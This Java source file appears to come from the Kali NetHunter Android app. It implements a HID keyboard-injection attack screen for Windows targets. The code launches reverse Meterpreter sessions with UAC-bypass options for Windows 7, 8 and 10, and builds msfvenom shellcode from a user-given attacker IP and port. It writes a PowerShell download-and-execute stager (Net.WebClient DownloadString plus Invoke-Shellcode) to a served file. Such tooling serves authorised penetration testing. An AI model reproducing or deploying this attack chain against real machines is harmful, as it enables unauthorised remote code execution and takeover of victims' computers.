package com.offsec.nethunter;

import android.app.ActionBar;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.FragmentTransaction;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Parcelable;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentStatePagerAdapter;
import android.support.v4.view.ViewPager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;

import com.offsec.nethunter.utils.NhPaths;
import com.offsec.nethunter.utils.ShellExecuter;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.util.concurrent.ExecutionException;

//import android.app.Fragment;
//import android.support.v4.app.FragmentActivity;

public class HidFragment extends Fragment implements ActionBar.TabListener {

    TabsPagerAdapter TabsPagerAdapter;
    ViewPager mViewPager;
    SharedPreferences sharedpreferences;
    static NhPaths nh;
    final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8", "Windows 10"};
    final CharSequence[] languages = {"American English", "Belgian", "British English", "Danish", "French", "German", "Italian", "Norwegian", "Portugese", "Russian", "Spanish", "Swedish"};
    private String configFilePath;
    String VenomOutput;
    String msfvenom;
    String msfvenomOut;
    private static final String TAG = "HidFragment";


    private static final String ARG_SECTION_NUMBER = "section_number";

    public HidFragment() {

    }

    public static HidFragment newInstance(int sectionNumber) {
        HidFragment fragment = new HidFragment();
        Bundle args = new Bundle();
        args.putInt(ARG_SECTION_NUMBER, sectionNumber);
        fragment.setArguments(args);
        return fragment;
    }

    @Override
    public void onAttach(Activity activity) {
        super.onAttach(activity);
        if (isAdded()) {
            nh = new NhPaths();
        }
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {

        View rootView = inflater.inflate(R.layout.hid, container, false);
        TabsPagerAdapter = new TabsPagerAdapter(getActivity().getSupportFragmentManager());

        mViewPager = (ViewPager) rootView.findViewById(R.id.pagerHid);
        mViewPager.setAdapter(TabsPagerAdapter);

        mViewPager.setOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
            @Override
            public void onPageSelected(int position) {
                getActivity().invalidateOptionsMenu();
            }
        });
        setHasOptionsMenu(true);
        sharedpreferences = getActivity().getSharedPreferences("com.offsec.nethunter", Context.MODE_PRIVATE);
        return rootView;
    }

    @Override
    public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {
        inflater.inflate(R.menu.hid, menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.start_service:
                start();
                return true;
            case R.id.stop_service:
                reset();
                return true;
            case R.id.admin:
                openDialog();
                return true;
            case R.id.chooseLanguage:
                openLanguageDialog();
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    private void start() {
        int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);
        String lang;
        switch (keyboardLayoutIndex) {
            case 1:
                lang = "be";
                break;
            case 2:
                lang = "uk";
                break;
            case 3:
                lang = "dk";
                break;
            case 4:
                lang = "fr";
                break;
            case 5:
                lang = "de";
                break;
            case 6:
                lang = "it";
                break;
            case 7:
                lang = "no";
                break;
            case 8:
                lang = "pt";
                break;
            case 9:
                lang = "ru";
                break;
            case 10:
                lang = "es";
                break;
            case 11:
                lang = "sv";
                break;
            default:
                lang = "us";
                break;
        }

        int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
        final String[] command = new String[1];
        int pageNum = mViewPager.getCurrentItem();
        if (pageNum == 0) {
            switch (UACBypassIndex) {
                case 0:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met --" + lang + "'";
                    break;
                case 1:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win7 --" + lang + "'";
                    break;
                case 2:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win8 --" + lang + "'";
                    break;
                case 3:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win10 --" + lang + "'";
                    break;
                default:
                    nh.showMessage("No option selected 1");
                    break;
            }
        } else if (pageNum == 1) {
            switch (UACBypassIndex) {
                case 0:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd --" + lang + "'";
                    break;
                case 1:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win7 --" + lang + "'";
                    break;
                case 2:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win8 --" + lang + "'";
                    break;
                case 3:
                    command[0] = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win10 --" + lang + "'";
                    break;
                default:
                    nh.showMessage("No option selected 2");
                    break;
            }
        }
        nh.showMessage("Attack launched...");
        new Thread(new Runnable() {
            public void run() {
                ShellExecuter exe = new ShellExecuter();
                exe.RunAsRoot(command);
                //Logger.appendLog(outp1);
                mViewPager.post(new Runnable() {
                    @Override
                    public void run() {

                        nh.showMessage("Attack execution ended.");
                    }
                });
            }

        }).start();
    }

    private void reset() {
        ShellExecuter exe = new ShellExecuter();
        String[] command = {"stop-badusb"};
        exe.RunAsRoot(command);
        nh.showMessage("Reseting USB");
    }


    public void openDialog() {

        int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
        builder.setTitle("UAC Bypass:");
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
            }
        });

        builder.setSingleChoiceItems(platforms, UACBypassIndex, new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                Editor editor = sharedpreferences.edit();
                editor.putInt("UACBypassIndex", which);
                editor.commit();
            }
        });
        builder.show();
    }

    public void openLanguageDialog() {

        int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);

        AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
        builder.setTitle("Keyboard Layout:");
        builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {

            }
        });

        builder.setSingleChoiceItems(languages, keyboardLayoutIndex, new DialogInterface.OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                Editor editor = sharedpreferences.edit();
                editor.putInt("HIDKeyboardLayoutIndex", which);
                editor.commit();
            }
        });
        builder.show();
    }

    @Override
    public void onTabUnselected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {

    }

    @Override
    public void onTabSelected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {
        mViewPager.setCurrentItem(tab.getPosition());
    }

    @Override
    public void onTabReselected(ActionBar.Tab tab, FragmentTransaction fragmentTransaction) {

    }


    //public static class TabsPagerAdapter extends FragmentPagerAdapter {
    public static class TabsPagerAdapter extends FragmentStatePagerAdapter {


        public TabsPagerAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public Fragment getItem(int i) {
            switch (i) {
                case 0:
                    return new PowerSploitFragment();
                default:
                    return new WindowsCmdFragment();
            }
        }

        @Override
        public Parcelable saveState() {
            return null;
        }

        @Override
        public int getCount() {
            return 2;
        }

        @Override
        public CharSequence getPageTitle(int position) {
            switch (position) {
                case 1:
                    return "Windows CMD";
                default:
                    return "PowerSploit";
            }
        }
    }

    public static class PowerSploitFragment extends HidFragment implements OnClickListener {

        private String configFileUrlPath = nh.CHROOT_PATH + "/var/www/html/powersploit-url";
        private String configFileVenom = nh.CHROOT_PATH + "/var/www/html/powersploit-venom";

        @Override
        public void onActivityCreated(Bundle savedInstanceState) {
            super.onActivityCreated(savedInstanceState);
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);
            Button b = (Button) rootView.findViewById(R.id.powersploitOptionsUpdate);
            b.setOnClickListener(this);
            return rootView;
        }

        public void onClick(View v) {
            switch (v.getId()) {
                case R.id.powersploitOptionsUpdate:
                    if(getView() == null){
                        return;
                    }
                    ShellExecuter exe = new ShellExecuter();
                    EditText ip = (EditText) getView().findViewById(R.id.ipaddress);
                    EditText port = (EditText) getView().findViewById(R.id.port);

                    Spinner payload = (Spinner) getView().findViewById(R.id.payload);
                    String payloadValue = payload.getSelectedItem().toString();

                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
                    msfvenom = "msfvenom -p " + payloadValue + " LHOST=" + ip.getText() + " LPORT=" + port.getText() + " -f powershell EXITFUNC=thread --platform windows -o /tmp/pwrshell_string";

                    getMSFvenomOut mytask = new getMSFvenomOut();
                    try {
                        mytask.execute().get();
                    } catch (InterruptedException | ExecutionException e) {
                        e.printStackTrace();
                    }

                    Log.d(TAG, "MSFVENOMOUT: " + msfvenomOut);

                    String newString = "Invoke-Shellcode -Force -Shellcode " + msfvenomOut;
                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;

                    Boolean isUrlpathSaved = exe.SaveFileContents(newText, configFileUrlPath);

                    if (!isUrlpathSaved){
                         nh.showMessage("Source not updated (configFileUrlPath)");
                    }
                    break;
                default:
                    nh.showMessage("Unknown click");
                    break;
            }
        }
    }

    public class getMSFvenomOut extends AsyncTask<Void, Void, String> {
            protected String doInBackground(Void... params) {
                ShellExecuter exe = new ShellExecuter();
                String command = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali custom_cmd \"" + msfvenom + "\"'";
                String command2 = "su -c '" + nh.APP_SCRIPTS_PATH + "/bootkali custom_cmd python /sdcard/nh_files/modules/powerball.py'";
                Log.d(TAG, command);
                try {
                    exe.RunAsRootOutput(command);
                    msfvenomOut = exe.RunAsRootOutput(command2);
                    msfvenomOut = msfvenomOut.substring(7);

                } catch (Exception e) {
                    Log.d(TAG, String.valueOf(e));
                };
                return null;
            }
        }

    public static class WindowsCmdFragment extends HidFragment implements OnClickListener {

        private String configFilePath = nh.APP_SD_FILES_PATH + "/configs/hid-cmd.conf";
        private String loadFilePath =  nh.APP_SD_FILES_PATH + "/scripts/hid/";
        ShellExecuter exe = new ShellExecuter();
        @Override
        public void onActivityCreated(Bundle savedInstanceState) {

            super.onActivityCreated(savedInstanceState);
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.hid_windows_cmd, container, false);
            EditText source = (EditText) rootView.findViewById(R.id.windowsCmdSource);
            exe.ReadFile_ASYNC(configFilePath, source);
            Button b = (Button) rootView.findViewById(R.id.windowsCmdUpdate);
            Button b1 = (Button) rootView.findViewById(R.id.windowsCmdLoad);
            Button b2 = (Button) rootView.findViewById(R.id.windowsCmdSave);
            b.setOnClickListener(this);
            b1.setOnClickListener(this);
            b2.setOnClickListener(this);
            return rootView;
        }

        private static final int PICKFILE_RESULT_CODE = 1;

        public void onClick(View v) {

            switch (v.getId()) {
                case R.id.windowsCmdUpdate:
                    if(getView() == null){
                        return;
                    }
                    EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                    String text = source.getText().toString();
                    Boolean isSaved = exe.SaveFileContents(text, configFilePath);
                    if(isSaved){
                        nh.showMessage("Source updated");
                    }

                    break;
                case R.id.windowsCmdLoad:
                    try {
                        File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
                        if(!scriptsDir.exists()) scriptsDir.mkdirs();
                    } catch (Exception e) {
                        nh.showMessage(e.getMessage());
                    }
                    Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                    Uri selectedUri = Uri.parse(nh.APP_SD_FILES_PATH + loadFilePath);
                    intent.setDataAndType(selectedUri, "file/*");
                    startActivityForResult(intent, PICKFILE_RESULT_CODE);
                    break;
                case R.id.windowsCmdSave:
					 try {
                        File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
                        if(!scriptsDir.exists()) scriptsDir.mkdirs();
                    } catch (Exception e) {
                         nh.showMessage(e.getMessage());
                    }
                    AlertDialog.Builder alert = new AlertDialog.Builder(getActivity());

                    alert.setTitle("Name");
                    alert.setMessage("Please enter a name for your script.");

                    // Set an EditText view to get user input
                    final EditText input = new EditText(getActivity());
                    alert.setView(input);

                    alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int whichButton) {
                            String value = input.getText().toString();
                            if(!value.equals("") && value.length() >0){
                            //FIXME Save file (ask name)
                                File scriptFile = new File(loadFilePath + File.separator +  value +".conf");
                                if(!scriptFile.exists()){
                                    try {
                                        if(getView() == null){
                                            return;
                                        }
                                        EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                                        String text = source.getText().toString();
                                        scriptFile.createNewFile();
                                        FileOutputStream fOut = new FileOutputStream(scriptFile);
                                        OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                                        myOutWriter.append(text);
                                        myOutWriter.close();
                                        fOut.close();
                                        nh.showMessage("Script saved");
                                    } catch (Exception e) {
                                        nh.showMessage(e.getMessage());
                                    }
                                }else{
                                    nh.showMessage("File already exists");
                                }
                            }else{
                                nh.showMessage("Wrong name provided");
                            }
                        }
                    });
                    alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int whichButton) {
                           ///Do nothing
                        }
                        });
                    alert.show();
                    break;
                default:
                    nh.showMessage("Unknown click");
                    break;
            }
        }

        @Override
        public void onActivityResult(int requestCode, int resultCode, Intent data) {
            switch (requestCode) {
                case PICKFILE_RESULT_CODE:
                    if (resultCode == Activity.RESULT_OK && getView() != null) {
                        String FilePath = data.getData().getPath();
                        EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                        exe.ReadFile_ASYNC(FilePath, source);
                        nh.showMessage("Script loaded");
                    }
                    break;
            }
        }
    }
}
